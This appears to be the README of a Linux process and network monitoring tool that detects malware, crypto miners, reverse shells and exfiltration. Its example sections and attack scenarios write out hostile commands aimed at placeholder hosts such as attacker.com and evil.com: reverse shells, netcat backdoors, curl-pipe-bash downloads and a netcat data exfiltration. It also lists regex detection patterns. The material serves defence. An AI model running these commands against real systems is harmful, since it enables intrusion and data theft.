# Process & Network Connection Monitor (PNCM)

A comprehensive Python tool for detecting malicious processes, suspicious network connections, C2 communications, and data exfiltration attempts on Linux systems. Essential for detecting malware, insider threats, and advanced persistent threats (APTs).

## 🎯 Perfect For

- **Malware Detection** - Identify malicious processes and miners
- **C2 Communication Detection** - Catch command & control callbacks
- **Data Exfiltration Prevention** - Monitor suspicious network activity
- **Insider Threat Detection** - Identify unauthorized data transfers
- **Cryptocurrency Miner Detection** - Stop resource theft
- **Backdoor Identification** - Find reverse shells and listeners
- **APT Detection** - Identify advanced persistent threats
- **Resource Abuse Monitoring** - Track CPU/memory misuse

## ✨ Features

- ✅ **Process Monitoring** - Detect suspicious commands and patterns
- ✅ **Network Connection Tracking** - Monitor all TCP/UDP connections
- ✅ **Listening Port Analysis** - Identify unauthorized services
- ✅ **C2 Detection** - Find command & control communications
- ✅ **Miner Detection** - Identify cryptocurrency miners
- ✅ **Reverse Shell Detection** - Catch bash/python/perl shells
- ✅ **Resource Usage Analysis** - Track CPU/memory abuse
- ✅ **Baseline Comparison** - Detect deviations from normal
- ✅ **Pattern Matching** - Regex-based threat detection
- ✅ **Zero Dependencies** - Pure Python 3 standard library

## 🚀 Quick Start

### 1. Create Baseline (Optional but Recommended)
```bash
# Capture normal system behavior
sudo python3 pncm.py --create-baseline
```

**Output:**
```
======================================================================
Creating Process & Network Baseline
======================================================================

📊 Collecting system behavior information...

📋 Baseline Statistics:
   Total processes: 157
   Unique users running processes: 12
   Active connections: 23
   Listening ports: 8

✅ Baseline created successfully!
💾 Saved to: pncm_baseline.json
```

### 2. Monitor for Suspicious Activity
```bash
# Real-time monitoring
sudo python3 pncm.py --monitor

# Monitor and export report
sudo python3 pncm.py --monitor --export security_report.json

# Monitor without baseline comparison
sudo python3 pncm.py --monitor --no-baseline
```

## 🔍 What PNCM Detects

### 1. Reverse Shells & C2 Communication (CRITICAL)
```
🚨 [CRITICAL] SUSPICIOUS_PROCESS: bash -i >& /dev/tcp/attacker.com/4444
   pid: 12345
   user: www-data
   reasons: Matches suspicious pattern: /dev/tcp/
```

**Attack Pattern:**
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
python -c 'import socket;...'
nc -e /bin/bash attacker.com 4444
```

### 2. Cryptocurrency Miners (CRITICAL)
```
🚨 [CRITICAL] SUSPICIOUS_PROCESS: ./xmrig --url pool.minexmr.com:443
   pid: 23456
   user: nobody
   cpu: 95%
   reasons: Matches suspicious pattern: xmrig
            High CPU usage: 95%
```

**Common Miners:**
- xmrig, xmr-stak
- cryptonight
- minergate
- coinhive (browser)

### 3. Download & Execute Attacks (CRITICAL)
```
🚨 [CRITICAL] SUSPICIOUS_PROCESS: curl http://evil.com/payload.sh | bash
   reasons: Matches suspicious pattern: curl.*\|.*bash
```

**Attack Patterns:**
```bash
wget http://evil.com/malware.sh | sh
curl http://c2.evil.com/payload | python
fetch http://attacker.com/script | perl
```

### 4. Netcat Listeners / Backdoors (CRITICAL)
```
🚨 [CRITICAL] SUSPICIOUS_PROCESS: nc -l -p 4444 -e /bin/bash
   reasons: Matches suspicious pattern: nc\s+-l

⚠️ [HIGH] SUSPICIOUS_LISTENER: Suspicious port listening: 4444
   reason: Common Metasploit
   process: nc
```

**Backdoor Patterns:**
```bash
nc -l -p 4444 -e /bin/bash
ncat -l 4445 --sh-exec "bash"
socat TCP-LISTEN:31337,fork EXEC:/bin/sh
```

### 5. Processes from Temp Directories (HIGH)
```
⚠️ [HIGH] SUSPICIOUS_PROCESS: /tmp/.hidden_miner
   reasons: Running from temporary directory
```

**Why Suspicious:**
- `/tmp/` - Common malware staging area
- `/dev/shm/` - In-memory execution
- No legitimate software runs from `/tmp`

### 6. Hidden Processes (HIGH)
```
⚠️ [HIGH] SUSPICIOUS_PROCESS: ./.backdoor --stealth
   reasons: Hidden process name (starts with .)
```

**Evasion Technique:**
```bash
./.miner &        # Hidden in process list
.systemd-helper   # Disguised as system process
```

### 7. Suspicious Network Connections (CRITICAL/HIGH)
```
🚨 [CRITICAL] SUSPICIOUS_CONNECTION: 192.168.1.10:45678 -> 203.0.113.45:4444
   protocol: tcp
   state: ESTABLISHED
   reasons: Suspicious port: 4444 (Common Metasploit)
```

**Red Flags:**
- Port 4444, 4445 (Metasploit)
- Port 1337, 31337 (Hacker ports)
- Port 6667 (IRC C2)
- Port 8333 (Bitcoin)
- Port 3333 (Mining pools)

### 8. IRC Botnet Communication (HIGH)
```
⚠️ [HIGH] SUSPICIOUS_CONNECTION: 10.0.0.5:54321 -> irc.evil.com:6667
   reasons: Suspicious port: 6667 (IRC - potential botnet)
```

**Botnet Indicators:**
- Connections to port 6667, 6697
- Multiple IRC connections
- Persistent IRC connections

### 9. Base64 Encoded Payloads (HIGH)
```
⚠️ [HIGH] SUSPICIOUS_PROCESS: echo 'abc123' | base64 -d | sh
   reasons: Matches suspicious pattern: base64.*-d.*\|
```

**Obfuscation Technique:**
```bash
echo 'ZXZpbCBjb2Rl' | base64 -d | bash  # Decode and execute
```

### 10. High CPU Usage (MEDIUM/CRITICAL)
```
⚡ [MEDIUM] SUSPICIOUS_PROCESS: unknown_process
   cpu: 87%
   reasons: High CPU usage: 87%
```

**If crypto miner:**
```
🚨 [CRITICAL] - Crypto miner with high CPU
```

### 11. Tor Network Usage (MEDIUM)
```
⚡ [MEDIUM] SUSPICIOUS_CONNECTION: 127.0.0.1:54321 -> 127.0.0.1:9050
   reasons: Suspicious port: 9050 (Tor SOCKS)
```

**Why Monitor:**
- Data exfiltration via Tor
- C2 communications
- Anonymization for malicious activity

### 12. New Listening Ports (MEDIUM)
```
⚡ [MEDIUM] NEW_LISTENING_PORT: New listening ports detected
   ports: 8888, 9999
```

**Baseline Comparison:**
- Ports not in baseline = new service
- Could be backdoor listener
- Requires investigation

## 💼 Real-World Attack Scenarios

### Scenario 1: Ransomware with Miner
**Attack Timeline:**
```bash
# 1. Initial compromise via phishing
wget http://malicious.com/payload.sh | bash

# 2. Deploy cryptocurrency miner
./xmrig --url pool.minexmr.com:443 --silent

# 3. Establish C2 channel
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# 4. Wait for ransom payment in crypto
# 5. Deploy ransomware if no payment
```

**PNCM Detection:**
```
🚨 [CRITICAL] wget http://malicious.com/payload.sh | bash
🚨 [CRITICAL] xmrig process with 95% CPU usage
🚨 [CRITICAL] Reverse shell to attacker.com:4444
⚠️ [HIGH] Outbound connection to mining pool

DETECTION TIME: < 5 seconds from execution
RESPONSE: Kill processes, isolate system, investigate
```

### Scenario 2: APT Lateral Movement
**Attack Pattern:**
```bash
# Attacker gained foothold on web server
# Now moving laterally to database server

# 1. Create persistent backdoor
nohup nc -l -p 31337 -e /bin/bash &

# 2. Scan internal network
./portscan 192.168.10.0/24

# 3. Exfiltrate data via DNS tunneling
./dnscat2 --server c2.attacker.com
```

**PNCM Detection:**
```
🚨 [CRITICAL] nc -l -p 31337 listener
⚠️ [HIGH] Suspicious port 31337 listening
⚠️ [HIGH] Port scan tool execution
⚠️ [HIGH] DNS tunneling pattern detected

DETECTION TIME: Real-time
RESPONSE: Isolate segment, hunt for IOCs
```

### Scenario 3: Insider Threat - Data Exfiltration
**Attack Pattern:**
```bash
# Disgruntled employee exfiltrating data

# 1. Compress sensitive data
tar czf /tmp/.backup.tar.gz /var/company_data/

# 2. Exfiltrate via netcat
cat /tmp/.backup.tar.gz | nc attacker.com 9999

# 3. Clean up traces
rm /tmp/.backup.tar.gz
```

**PNCM Detection:**
```
⚠️ [HIGH] Process running from /tmp directory
🚨 [CRITICAL] nc (netcat) process detected
⚠️ [HIGH] Large data transfer to external IP

DETECTION TIME: During transfer
RESPONSE: Block connection, preserve evidence
```

### Scenario 4: Fileless Malware
**Attack Pattern:**
```bash
# Malware executes in-memory only

# 1. Download payload to memory
curl http://evil.com/stage2.sh | bash

# 2. Python reverse shell (no files)
python3 -c 'import socket; s=socket.socket(); s.connect(("attacker.com", 443)); ...'

# 3. PowerShell on Linux (very suspicious!)
pwsh -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')"
```

**PNCM Detection:**
```
🚨 [CRITICAL] curl | bash pattern
🚨 [CRITICAL] Python socket pattern
🚨 [CRITICAL] PowerShell on Linux (extremely rare)

DETECTION TIME: Immediate
ADVANTAGE: Catches fileless attacks other tools miss
```

## 🏥 Healthcare & Critical Infrastructure Use Cases

### Healthcare Environment

**Threat Scenarios:**
- Ransomware deployment
- Crypto miners on medical devices
- Data exfiltration of PHI
- C2 communications from EHR

**PNCM Deployment:**
```bash
# Monitor EHR servers
*/5 * * * * /usr/local/bin/pncm.py --monitor --export /var/log/pncm/ehr_$(date +\%s).json

# Alert on any CRITICAL findings
*/5 * * * * /usr/local/bin/pncm_alert.sh
```

**pncm_alert.sh:**
```bash
#!/bin/bash
if ! python3 /usr/local/bin/pncm.py --monitor; then
    CRITICAL=$(cat /tmp/pncm_report.json | jq '.severity_counts.CRITICAL')
    if [ "$CRITICAL" -gt 0 ]; then
        # Alert security & isolate
        echo "CRITICAL: Malware detected on EHR server" | \
        mail -s "PNCM ALERT" security@hospital.org
        
        # Optional: Auto-isolate infected host
        # /usr/local/bin/isolate_network.sh
    fi
fi
```

### Critical Infrastructure - SCADA

**Threat Scenarios:**
- Nation-state C2 beaconing
- Lateral movement tools
- Data exfiltration from ICS
- Backdoor persistence

**Air-Gapped Monitoring:**
```bash
# PNCM works on air-gapped systems!
# No internet dependency = perfect for ICS/SCADA

# Run every minute for critical systems
* * * * * /usr/local/bin/pncm.py --monitor

# Export to isolated SIEM
*/5 * * * * cp /tmp/pncm_report.json /mnt/siem_share/
```

## 📊 Detection Patterns

### Process Command Patterns (Regex)
```python
suspicious_commands = [
    r'nc\s+-l',                    # Netcat listener
    r'bash\s+-i',                  # Interactive bash
    r'/dev/tcp/',                  # Bash TCP socket
    r'python.*-c.*socket',         # Python socket
    r'cryptonight|xmrig',          # Crypto miners
    r'wget.*\|.*sh',               # Download & execute
    r'curl.*\|.*bash',             # Download & execute
    r'base64.*-d.*\|',             # Base64 decode
    r'powershell',                 # PowerShell on Linux
]
```

### Suspicious Ports
```python
suspicious_ports = {
    4444: 'Common Metasploit',
    4445: 'Common Metasploit',
    1337: 'Common hacker port',
    31337: 'Elite hacker port',
    6667: 'IRC (potential botnet)',
    8333: 'Bitcoin',
    3333: 'Mining pool',
    9050: 'Tor SOCKS',
}
```

### Detection Logic
```
IF process_command matches suspicious_pattern THEN
    severity = CRITICAL
    category = SUSPICIOUS_PROCESS
    
IF connection_to suspicious_port THEN
    severity = CRITICAL/HIGH
    category = SUSPICIOUS_CONNECTION
    
IF process_from /tmp/ OR /dev/shm/ THEN
    severity = HIGH
    category = SUSPICIOUS_PROCESS
    
IF process_name starts_with "." THEN
    severity = HIGH
    reason = "Hidden process"
```

## 🔧 Configuration & Tuning

### Custom Suspicious Patterns
Edit `pncm.py` to add your own patterns:

```python
# Add custom patterns
self.suspicious_commands.extend([
    r'custom_malware_name',
    r'company_specific_threat',
    r'proprietary_exfil_tool',
])

# Add custom suspicious ports
self.suspicious_ports.update({
    9876: 'Custom C2 port',
    54321: 'Known APT backdoor'
})

# Add whitelisted processes
self.known_good_processes.update({
    'your_custom_process',
    'legitimate_tool'
})
```

### Baseline Management
```bash
# Create baseline during known-good state
python3 pncm.py --create-baseline

# Backup baseline
cp pncm_baseline.json pncm_baseline_$(date +%Y%m%d).json.bak

# Update baseline after legitimate changes
python3 pncm.py --create-baseline
```

### Alert Thresholds
```python
# Adjust CPU threshold for high CPU alerts
if float(process['cpu']) > 80.0:  # Change to 90.0 for less sensitive

# Adjust detection severity
severity = 'HIGH' if 'miner' in suspicions else 'MEDIUM'
```

## 📈 Performance & Scalability

### Resource Usage
```
CPU: < 5% during monitoring
Memory: < 50MB
Disk: Minimal (baseline + reports)
Network: None (local monitoring only)
```

### Scan Time
```
Small system (< 50 processes): < 1 second
Medium system (100-500 processes): 1-3 seconds
Large system (1000+ processes): 5-10 seconds
```

### Recommended Schedule
```bash
# Critical systems - Every minute
* * * * * /usr/local/bin/pncm.py --monitor

# Normal systems - Every 5 minutes
*/5 * * * * /usr/local/bin/pncm.py --monitor

# Low priority - Every hour
0 * * * * /usr/local/bin/pncm.py --monitor
```

## 🎓 Integration Examples

### SIEM Integration (Splunk)
```bash
#!/bin/bash
# Send PNCM alerts to Splunk

python3 pncm.py --monitor --export /tmp/pncm.json

if [ -f /tmp/pncm.json ]; then
    curl -k "https://splunk:8088/services/collector" \
         -H "Authorization: Splunk YOUR_HEC_TOKEN" \
         -d @/tmp/pncm.json
fi
```

### Email Alerts
```bash
#!/bin/bash
# Email on CRITICAL findings

if ! python3 pncm.py --monitor > /tmp/pncm_output.txt; then
    grep -q "CRITICAL" /tmp/pncm_output.txt
    if [ $? -eq 0 ]; then
        mail -s "PNCM CRITICAL Alert - $(hostname)" \
             security@company.com < /tmp/pncm_output.txt
    fi
fi
```

### Slack Integration
```bash
#!/bin/bash
# Send to Slack

REPORT=$(python3 pncm.py --monitor --export - 2>&1)

if echo "$REPORT" | grep -q "CRITICAL"; then
    CRITICAL_COUNT=$(echo "$REPORT" | grep -c "CRITICAL")
    
    curl -X POST https://hooks.slack.com/YOUR_WEBHOOK \
         -H 'Content-Type: application/json' \
         -d "{\"text\":\"🚨 PNCM Alert: $CRITICAL_COUNT CRITICAL findings on $(hostname)\"}"
fi
```

### Automated Response
```bash
#!/bin/bash
# Auto-kill suspicious processes

python3 pncm.py --monitor --export /tmp/pncm.json

# Check for crypto miners
MINERS=$(cat /tmp/pncm.json | jq -r '.alerts.SUSPICIOUS_PROCESS[] | select(.details.reasons[] | contains("miner")) | .details.pid')

if [ ! -z "$MINERS" ]; then
    for PID in $MINERS; do
        echo "Killing suspected miner: $PID"
        kill -9 $PID
        
        # Log the action
        logger -p security.crit "PNCM: Killed suspected miner PID $PID"
    done
fi
```

## 🔒 Security Best Practices

### 1. Protect the Monitor
```bash
# PNCM itself could be targeted

# Make read-only
sudo chattr +i /usr/local/bin/pncm.py

# Verify integrity
sha256sum /usr/local/bin/pncm.py > /secure/pncm.sha256

# Check before each run
sha256sum -c /secure/pncm.sha256
```

### 2. Secure Baseline
```bash
# Store baseline securely
cp pncm_baseline.json /secure/readonly/

# Make immutable
sudo chattr +i /secure/readonly/pncm_baseline.json
```

### 3. Monitor the Logs
```bash
# Ensure PNCM logs aren't tampered with
grep "PNCM" /var/log/syslog | tail -100
```

### 4. Regular Updates
```bash
# Update suspicious patterns regularly
# based on new threat intelligence

# Update every month
crontab -e
# Add: 0 0 1 * * /usr/local/bin/update_pncm_patterns.sh
```

## 💡 Pro Tips

1. **Baseline After Patching** - Recreate baseline after system updates
2. **Whitelist Legitimate Tools** - Add pentesting tools if authorized
3. **Combine with Other Tools** - Use with FIM, PED for complete coverage
4. **Test Detection** - Run safe simulations to verify detection
5. **Review False Positives** - Tune patterns to reduce noise
6. **Export Everything** - Keep JSON reports for forensics
7. **Air-Gap Compatible** - Works without internet connectivity
8. **Quick Response** - Automate response for CRITICAL findings

## 📚 References

- MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
- MITRE ATT&CK: T1071 (Application Layer Protocol)
- MITRE ATT&CK: T1027 (Obfuscated Files or Information)
- NIST SP 800-53: SI-4 (Information System Monitoring)
- CIS Controls: 8.5 (Collect Detailed Audit Logs)

## 📄 License

MIT License - Use for security monitoring

---

**Remember:** Attackers rely on going unnoticed. PNCM makes sure they don't. Real-time process and network monitoring is the difference between a contained incident and a catastrophic breach!
